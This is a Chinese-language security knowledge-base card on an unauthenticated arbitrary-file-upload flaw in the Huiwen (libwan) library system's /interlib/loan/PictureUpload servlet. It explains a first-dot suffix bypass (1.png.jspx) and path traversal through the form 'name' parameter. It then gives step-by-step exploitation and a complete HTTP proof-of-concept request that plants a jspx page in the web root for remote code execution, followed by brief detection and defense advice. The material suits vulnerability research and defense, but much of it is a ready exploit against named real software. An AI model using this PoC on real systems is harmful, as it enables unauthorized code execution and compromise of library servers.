---
id: web-generic-file-upload-libwan-pictureupload-name-concat-firstdot-jspx
title: 汇文图书馆系统未授权 /loan/PictureUpload：文件名由 name 参数拼接、后缀取 filename 首个点后内容，jsp 转 txt 可用 1.png.jspx 绕过并目录穿越落 web 根
type: scenario
domain: web
path: web/generic/file-upload
technique: name-param-filename-firstdot-jspx-bypass
tags:
- file-upload
- java
- jspx
- path-traversal
- webshell
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-23
  verified_at: '2026-11-08T13:48:11+08:00'
  notes: 已对照原文核对：无鉴权（Upload 302 vs PictureUpload GET 200、import 无 UserSession）、MultipartRequest 两段式落盘、b.b 首个点后缀+jsp 转 txt、name 拼接穿越、SERVERPATH 回显均与图 04-45 一致。核对中修正 PoC 参数错误：原文实测 name="/../1"（SERVERPATH 回显 /../1=/../1.png.jspx，GET /interlib/1.png.jspx 200 自洽），原卡误写 name="../1/1.png" 会多出 .png 后缀导致 PoC 不自洽，已改为原文实测值。未验证点：目标系统真实环境复现。
url: /docs/web/generic/file-upload/web-generic-file-upload-libwan-pictureupload-name-concat-firstdot-jspx/
draft: false
kb_aliases:
- 汇文 PictureUpload 任意上传
- interlib loan PictureUpload
- 首个点后缀截取绕过
- jsp 替换 txt jspx 绕过
---

# 汇文图书馆系统未授权 /loan/PictureUpload：文件名由 name 参数拼接、后缀取 filename 首个点后内容，jsp 转 txt 可用 1.png.jspx 绕过并目录穿越落 web 根

## 一句话结论

汇文（com.libwan）图书馆管理系统 Tomcat 部署包中 `/interlib/loan/PictureUpload` 无权限校验：内部流程先经 com.oreilly.servlet.MultipartRequest 把上传文件按 multipart filename 原名写入 `/tmp`，随后图片处理类把文件复制为「最终名 = 表单 `name` 参数值 + `b.b(filename)` 后缀」并删除原文件；`b.b` 仅在 filename 以 `.jsp` 结尾时替换为 `.txt`、否则返回**首个点**之后的全部字符，因此 `filename=1.png.jspx` 既满足图片后缀检查又落出 `.jspx` 后缀，且 filename 全程不过滤可 `../` 目录穿越，实测上传 jspx 至 web 根 `GET /interlib/1.png.jspx` 返回 200 完成 RCE。

## 原理

- 权限缺口：web.xml 中 `/loan/PictureUpload` 映射 com.libwan.servlets.PictureUpload，其代码不含 session/UserSession 校验（对比同包 Upload servlet 引入 com.libwan.utils.UserSession 属后台接口，访问 302 跳 noLogin），前台可直接 POST。
- 两段式落盘：PictureUpload.doPost 先 `getRealPath("/tmp/")` 并把请求交给混淆类 b.a→k.a→`new MultipartRequest(request, tmpDir, 500*1024)`，此阶段文件以 multipart 原始 filename（如 `1.png`）写入 tmp（writeTo 内 `new File(paramFile, this.fileName)`）；随后 b.c() 遍历上传文件哈希表（键=表单 name 值，值=getFilesystemName 即 filename），对每个文件调 `b(filename, name)`：e1=tmp/filename，最终名 `str = name + b.b(filename)`，复制 e1 内容到 tmp/name+后缀 后删除原文件。
- 后缀绕过：`b.b(filename)` 只有两条规则——`endsWith(".jsp")` 时返回 `".txt"`（把 jsp 变 txt）；否则返回 `filename.substring(filename.indexOf("."))`，即**第一个点**起的整段。图片存在性检查（k.b/b 方法入口）用 `indexOf(".jpg")/.jpeg/...` 子串匹配，`1.png.jspx` 同时满足：含 `.png`（过检查）、不以 `.jsp` 结尾（不触发替换）、首个点后为 `.png.jspx`（最终后缀 jspx）。Tomcat 默认解析 jspx 为 JSPX 页执行。
- 目录穿越：multipart filename 进入 `new File(parent, child)` 时未过滤 `../`（oreilly 库 extractDispositionInfo 仅截 basename 用于 FilePart.fileName，但后续 `File(tmpDir, name+b.b(filename))` 的 name 参数完全由表单控制，可携带 `../`），tmp 目录本身禁列目录（直接访问返回「拒绝访问」），故必须穿越或用响应回显的 SERVERPATH 定位。
- 响应 XML 的 `<SERVERPATH>` 会回显最终落盘相对路径，可直接确认成功与位置。

## 触发条件

- 目标为汇文图书馆系统（/interlib 路径前缀，com.libwan 包，Tomcat 部署）；
- `/interlib/loan/PictureUpload` 前台可达（无鉴权）；
- tmp 目录经 getRealPath("/tmp/") 位于 web 应用内，jspx 可被容器解析。

## 利用步骤

1. `GET /interlib/common/Upload` 确认 302 跳 noLogin（该接口为后台不可用），改打 `/interlib/loan/PictureUpload`（GET 返回 200 即前台可达）。
2. 先传一张 `filename=1.png` 的 png 观察响应：返回 `<SERVERPATH>_.JPG</SERVERPATH>` 与「文件上传失败」属正常（doPost 对 tmp/_.JPG 判定），说明接口可达且改名逻辑生效。
3. 构造绕过包：`Content-Disposition: form-data; name="/../1"; filename="2.png.jspx"`，文件体为 jspx webshell；最终落盘名 = `name + b.b(filename)` = `"/../1" + ".png.jspx"`，即 `tmp/../1.png.jspx`（name 携带 `../` 穿越出 tmp 到 web 应用根），响应 SERVERPATH 回显 `"/../1=/../1.png.jspx"` 且报「文件上传成功」。
4. `GET /interlib/1.png.jspx`（穿越到 web 根时）确认 200 执行。

## PoC

```http
POST /interlib/loan/PictureUpload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="/../1"; filename="2.png.jspx"
Content-Type: image/png

<jsp:root xmlns:jsp="http://jsp.java.sun.com/JSP/Page" version="1.2"><jsp:directive.page contentType="text/html"/><jsp:scriptlet>out.println("ok");</jsp:scriptlet></jsp:root>
------WebKitFormBoundary--
```

原文实测（2025-05 地市 hw）：SERVERPATH 回显 `"/../1=/../1.png.jspx"`、上传成功；`GET /interlib/1.png.jspx` 返回 200。

## 变体与关联

- 变体：后缀取首个点后内容的实现（substring(indexOf("."))）都可用 `1.png.jspx` / `1.png.jspf` 类双后缀绕过图片检查；`endsWith(".jsp")` 类黑名单对 jspx/jspf/war 天然失效。
- 变体：name 参数携带 `../` 数量按 tmp 深度调整，也可直接写到其他可解析目录。
- 关联：[[web-generic-file-upload-goldlib-opac-original-extension-upload]]（金盘图书馆 OPAC 保留原始后缀上传，同为图书馆行业但厂商与机制不同）。
- 关联：[[web-generic-file-upload-empty-filename-path-concat-bypass]]（同为「落盘名不完全来自 multipart filename」的校验绕过分支）。
- 审计提示：该系统类名方法名混淆为 a/b/c，关键落盘函数极易漏跟；对混淆代码要沿 doPost 数据流逐步跟进，第三方库（oreilly MultipartRequest）处理部分可略读。

## 检测与防御

- 检测：/loan/PictureUpload 的 multipart 中 filename 含多重点号或 name 参数含 `../`；响应 XML SERVERPATH 含 jspx；web 目录新增 jspx/png.jspx 文件。
- 防御：PictureUpload 增加鉴权；最终文件名服务端生成、白名单后缀且取 lastIndexOf 后缀校验；过滤 name 参数中的路径分隔符；容器禁用 JSPX 解析（web.xml servlet-mapping 移除）。
